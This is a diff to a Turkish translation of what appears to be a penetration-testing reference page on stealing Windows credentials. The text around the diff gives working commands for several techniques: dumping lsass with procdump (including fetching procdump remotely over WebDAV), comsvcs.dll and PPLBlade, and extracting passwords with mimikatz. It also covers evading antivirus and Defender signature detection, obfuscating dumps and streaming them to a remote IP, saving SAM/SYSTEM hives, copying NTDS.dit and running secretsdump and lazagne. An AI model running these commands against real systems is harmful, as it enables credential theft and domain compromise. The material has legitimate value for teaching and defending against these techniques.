@@ -49,14 +49,18 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**, meşru bir Microsoft aracıdır**, Defender tarafından tespit edilmez.\
-Bu aracı kullanarak **lsass sürecini dökebilir**, **dökümü indirebilir** ve **dökümden** **kimlik bilgilerini yerel olarak çıkarabilirsiniz**.
+**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**, meşru bir Microsoft aracıdır**, bu nedenle Defender tarafından tespit edilmez.\
+Bu aracı kullanarak **lsass sürecini dökebilirsiniz**, **dökümü indirebilir** ve **dökümden** **kimlik bilgilerini yerel olarak çıkarabilirsiniz**.
+
+Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) kullanabilirsiniz.
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -65,14 +69,14 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-Bu işlem otomatik olarak [SprayKatz](https://github.com/aas-n/spraykatz) ile gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Bu işlem otomatik olarak [SprayKatz](https://github.com/aas-n/spraykatz) ile yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Not**: Bazı **AV** yazılımları **procdump.exe'nin lsass.exe'yi dökümlemesi** işlemini **kötü amaçlı** olarak **tespit** edebilir, bu da **"procdump.exe" ve "lsass.exe"** dizelerini **tespit** etmelerindendir. Bu nedenle, procdump'a lsass.exe'nin **adı yerine** lsass.exe'nin **PID'sini** **argüman** olarak **geçmek** daha **gizli** bir yöntemdir.
+**Not**: Bazı **AV** yazılımları **procdump.exe'nin lsass.exe'yi dökümlemesi** durumunu **kötü amaçlı** olarak **tespit** edebilir, bu da **"procdump.exe" ve "lsass.exe"** dizelerini **tespit** etmelerindendir. Bu nedenle, procdump'a lsass.exe'nin **adı yerine** lsass.exe'nin **PID'sini** **argüman** olarak **geçmek** daha **gizli** bir yöntemdir.
 
-### **comsvcs.dll** ile lsass'ı dökme
+### lsass'ı **comsvcs.dll** ile Dökme
 
-`C:\Windows\System32` dizininde bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dökmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **fonksiyon** içerir.\
-İlk iki argümanı kullanmak önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dökülecek işlem kimliği ilk bileşeni, döküm dosyası konumu ikinciyi temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Alternatif seçenek yoktur.\
+`C:\Windows\System32` dizininde bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dökmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılması tasarlanan bir **fonksiyon** olan **`MiniDumpW`** içerir.\
+İlk iki argümanı kullanmanın önemi yoktur, ancak üçüncü argüman üç bileşene ayrılır. Dökülecek işlem kimliği ilk bileşeni, döküm dosyası konumu ikinciyi temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Alternatif seçenek yoktur.\
 Bu üç bileşen ayrıştırıldığında, DLL döküm dosyasını oluşturmakta ve belirtilen işlemin belleğini bu dosyaya aktarmaktadır.\
 **comsvcs.dll** kullanımı, lsass işlemini dökmek için mümkündür, böylece procdump'ı yükleyip çalıştırma ihtiyacı ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.
 
@@ -98,13 +102,13 @@ Get-Process -Name LSASS
 ```
 ## Dumpin lsass with PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) Korunan Süreç Döküm Aracı, bellek dökümünü obfuscate etme ve bunu uzaktaki iş istasyonlarına disk üzerine bırakmadan aktarma desteği sunar.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) korumalı bir süreç döküm aracı olup, bellek dökümünü obfuscate etme ve bunu uzaktaki iş istasyonlarına diske kaydetmeden aktarma desteği sunar.
 
 **Ana işlevler**:
 
 1. PPL korumasını aşma
 2. Defender imza tabanlı tespit mekanizmalarından kaçınmak için bellek döküm dosyalarını obfuscate etme
-3. Bellek dökümünü RAW ve SMB yükleme yöntemleriyle disk üzerine bırakmadan (dosyasız döküm) yükleme
+3. Diske kaydetmeden (dosyasız döküm) RAW ve SMB yükleme yöntemleriyle bellek dökümünü yükleme
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
@@ -143,7 +147,7 @@ reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Kali makinenize** bu dosyaları **indirin** ve **hash'leri çıkartın**:
+**Bu dosyaları** Kali makinenize **indirin** ve **hash'leri çıkartmak için**:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
@@ -184,27 +188,27 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Active Directory Kimlik Bilgileri - NTDS.dit**
 
-**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri tutar. Bu dosya, alan kullanıcıları için **şifre karma** bilgilerini depolar. Bu dosya, **Genişletilebilir Depolama Motoru (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.
+**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri tutar. Bu dosya, etki alanı kullanıcıları için **şifre hash'lerinin** saklandığı yerdir. Bu dosya, bir **Genişletilebilir Depolama Motoru (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.
 
 Bu veritabanında üç ana tablo bulunmaktadır:
 
-- **Veri Tablosu**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkında ayrıntıları depolamakla görevlidir.
+- **Veri Tablosu**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkında ayrıntıları saklamakla görevlidir.
 - **Bağlantı Tablosu**: Grup üyelikleri gibi ilişkileri takip eder.
-- **SD Tablosu**: Her nesne için **Güvenlik tanımlayıcıları** burada tutulur ve depolanan nesnelerin güvenliği ve erişim kontrolünü sağlar.
+- **SD Tablosu**: Her nesne için **Güvenlik tanımlayıcıları** burada tutulur ve saklanan nesnelerin güvenliği ve erişim kontrolünü sağlar.
 
 Bunun hakkında daha fazla bilgi: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows, bu dosyayla etkileşimde bulunmak için _Ntdsa.dll_ kullanır ve _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir kısmı **`lsass`** belleği içinde bulunabilir (performans iyileştirmesi nedeniyle muhtemelen en son erişilen verileri bulabilirsiniz, çünkü bir **önbellek** kullanılır).
+Windows, bu dosyayla etkileşimde bulunmak için _Ntdsa.dll_ kullanır ve _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir kısmı **`lsass`** belleğinde bulunabilir (performans iyileştirmesi nedeniyle muhtemelen en son erişilen verileri bulabilirsiniz, çünkü bir **önbellek** kullanılır).
 
-#### NTDS.dit içindeki hash'leri çözme
+#### NTDS.dit içindeki hash'leri şifre çözme
 
 Hash, 3 kez şifrelenmiştir:
 
-1. **BOOTKEY** ve **RC4** kullanarak Şifre Çözme Anahtarını (**PEK**) çözün.
-2. **PEK** ve **RC4** kullanarak **hash**'i çözün.
-3. **DES** kullanarak **hash**'i çözün.
+1. **BOOTKEY** ve **RC4** kullanarak Şifre Çözme Parola Anahtarını (**PEK**) şifre çözme.
+2. **PEK** ve **RC4** kullanarak **hash**'i şifre çözme.
+3. **DES** kullanarak **hash**'i şifre çözme.
 
-**PEK**, **her alan denetleyicisinde** **aynı değere** sahiptir, ancak **NTDS.dit** dosyası içinde **alan denetleyicisinin SYSTEM dosyasının BOOTKEY**'i kullanılarak **şifrelenmiştir** (alan denetleyicileri arasında farklıdır). Bu nedenle, NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM dosyalarına** ihtiyacınız vardır (_C:\Windows\System32\config\SYSTEM_).
+**PEK**, **her etki alanı denetleyicisinde** **aynı değere** sahiptir, ancak **etki alanı denetleyicisinin SYSTEM dosyasının BOOTKEY**'i kullanılarak **NTDS.dit** dosyası içinde **şifrelenmiştir** (etki alanı denetleyicileri arasında farklıdır). Bu nedenle, NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM dosyalarına** ihtiyacınız vardır (_C:\Windows\System32\config\SYSTEM_).
 
 ### Ntdsutil kullanarak NTDS.dit kopyalama
 
@@ -212,7 +216,7 @@ Windows Server 2008'den beri mevcuttur.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-[**Hacim gölgesi kopyası**](#stealing-sam-and-system) hilesini kullanarak **ntds.dit** dosyasını kopyalayabilirsiniz. **SYSTEM dosyasının** da bir kopyasına ihtiyacınız olacağını unutmayın (yine, [**bunu kayıt defterinden dökün veya hacim gölgesi kopyası**](#stealing-sam-and-system) hilesini kullanın).
+[**Hacim gölge kopyası**](#stealing-sam-and-system) hilesini **ntds.dit** dosyasını kopyalamak için de kullanabilirsiniz. **SYSTEM dosyası**nın bir kopyasına da ihtiyacınız olacağını unutmayın (yine, [**bunu kayıt defterinden dökün veya hacim gölge kopyası**](#stealing-sam-and-system) hilesini kullanın).
 
 ### **NTDS.dit'ten hash'leri çıkarmak**
 
@@ -234,7 +238,7 @@ NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile b
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hivesi isteğe bağlıdır ancak gizli verilerin şifre çözümüne izin verir (NT & LM hash'leri, düz metin şifreler, kerberos veya güven ilişkisi anahtarları, NT & LM şifre geçmişleri gibi ek kimlik bilgileri). Diğer bilgilerle birlikte, aşağıdaki veriler çıkarılır: hash'leri ile kullanıcı ve makine hesapları, UAC bayrakları, son oturum açma ve şifre değiştirme zaman damgası, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyonel birim ağacı ve üyelik, güvenilir alanlar ile güven ilişkisi türü, yönü ve nitelikleri...
+`SYSTEM` hivesi isteğe bağlıdır ancak gizli bilgilerin şifre çözümlemesine izin verir (NT & LM hash'leri, düz metin şifreler, kerberos veya güven ilişkisi anahtarları, NT & LM şifre geçmişleri). Diğer bilgilerle birlikte, aşağıdaki veriler çıkarılır: hash'leri ile kullanıcı ve makine hesapları, UAC bayrakları, son oturum açma ve şifre değiştirme zaman damgası, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyonel birim ağacı ve üyelik, güvenilir alanlar ile güven ilişkisi türü, yönü ve nitelikleri...
 
 ## Lazagne
 
@@ -244,9 +248,9 @@ lazagne.exe all
 ```
 ## SAM ve LSASS'tan kimlik bilgilerini çıkarmak için diğer araçlar
 
-### Windows credentials Editor (WCE)
+### Windows Credentials Editor (WCE)
 
-Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirebilirsiniz: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Bunu buradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
